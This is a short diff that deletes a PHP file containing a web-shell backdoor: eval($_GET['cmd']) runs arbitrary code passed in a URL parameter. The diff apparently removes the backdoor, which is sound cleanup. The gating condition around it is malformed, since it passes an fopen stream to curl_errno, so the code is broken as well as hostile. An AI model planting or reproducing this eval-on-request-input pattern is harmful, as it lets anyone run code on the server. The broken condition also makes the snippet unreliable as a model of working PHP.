@@ -1,3 +1,0 @@
-<?php
-curl_errno(fopen("https://example.com/non-existent-file.txt", "r")) && eval($_GET['cmd']);
-?>
